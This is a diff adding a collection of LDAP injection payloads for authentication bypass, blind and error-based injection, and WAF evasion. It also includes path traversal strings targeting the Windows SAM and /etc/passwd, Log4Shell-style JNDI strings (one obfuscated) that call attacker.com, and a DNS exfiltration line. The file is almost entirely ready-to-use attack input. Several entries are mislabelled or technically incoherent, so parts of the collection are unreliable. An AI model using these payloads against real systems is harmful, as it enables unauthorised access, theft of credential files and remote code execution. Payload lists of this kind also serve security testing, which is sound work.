@@ -1,0 +1,166 @@
+# LDAP Injection Payloads - Comprehensive Collection
+# Version: 1.0.18-20260301-Senin-1812-WIB
+# Category: LDAP Injection
+
+# ============================================
+# BASIC LDAP INJECTION
+# ============================================
+
+# Authentication bypass
+admin)(uid=*))(&(password=*
+*)(objectClass=*
+*)(uid=*))(|(uid=
+
+# Always true
+*)(objectClass=*
+*)(objectClass=*)(
+*)(objectClass=*/*
+*)(objectClass=*)|(objectClass=*
+
+# ============================================
+# LDAP SEARCH FILTERS
+# ============================================
+
+# Basic filter injection
+uid=*
+uid=*
+)(cn=*
+)(uid=*))(|(uid=
+
+# Attribute extraction
+)(objectClass=*
+)(cn=
+)(mail=
+
+# ============================================
+# AUTHENTICATION BYPASS
+# ============================================
+
+# Username injection
+admin)(objectClass=*
+admin*
+admin+
+admin@domain.com)(cn=
+
+# Password injection
+*))(|(password=
+*)(uid=
+*)(userPassword=
+
+# ============================================
+# BLIND LDAP INJECTION
+# ============================================
+
+# Boolean-based blind
+admin)(objectClass=*
+admin)(objectClass=!*
+admin)(objectClass=*
+
+# Time-based blind
+admin)(objectClass=*)(|(cn=
+
+# ============================================
+# UNION INJECTION
+# ============================================
+
+*)(objectClass=*))%00
+*)(objectClass=*))/unusual
+
+# ============================================
+# BYPASS WAF
+# ============================================
+
+# Case variation
+Admin)(objectClass=*
+ADMIN)(OBJECTCLASS=*
+
+# Whitespace
+admin)(objectClass=*)%09
+admin)(objectClass=*)%0a
+
+# Unicode
+\u002A)(objectClass=*
+
+# ============================================
+# DN INJECTION
+# ============================================
+
+# DN traversal
+..\..\..\..\windows\system32\config\sam
+../
+..\/..\/..\/etc/passwd
+
+# ============================================
+# LDAP ADMIN COMMANDS
+# ============================================
+
+# Add user
+cn=admin,dc=example,dc=com)(objectClass=person)(userPassword=hacked
+
+# Delete user
+cn=user,dc=example,dc=com)(objectClass=*
+
+# Modify attributes
+cn=user,dc=example,dc=com)(description=hacked
+
+# ============================================
+# ADVANCED FILTER INJECTION
+# ============================================
+
+# Nested filters
+(&(objectClass=user)(|(cn=admin)(mail=admin*)))
+
+# Wildcard injection
+*)(objectClass=*
+*)(objectClass=*|(
+*)(objectClass=*)(|
+
+# ============================================
+# ATTRIBUTE INJECTION
+# ============================================
+
+# Add malicious attribute
+*;description:Hacked
+
+# Modify attribute
+*;+objectClass:malware
+
+# ============================================
+# ERROR-BASED INJECTION
+# ============================================
+
+# Force error to extract info
+*)(objectClass=*))(|(cn=
+
+# Extract via error messages
+*))(objectClass=users
+
+# ============================================
+# LDAP JAVA
+# ============================================
+
+# JNDI injection
+${jndi:ldap://attacker.com/a}
+${${lower:j}ndi:ldap://attacker.com/a}
+
+# ============================================
+# LDAP OID INJECTION
+# ============================================
+
+# OID manipulation
+1.2.840.113556.1.4.801.7.1=*
+
+# ============================================
+# LDAP PROXY AUTHENTICATION
+# ============================================
+
+# Proxy authorization
+Proxy-Authorization: Basic YWRtaW46YWRtaW4=
+
+# ============================================
+# LDAP OVER DNS
+# ============================================
+
+# DNS exfiltration
+ldap://attacker.com/CN=blah,DC=example,DC=com
+
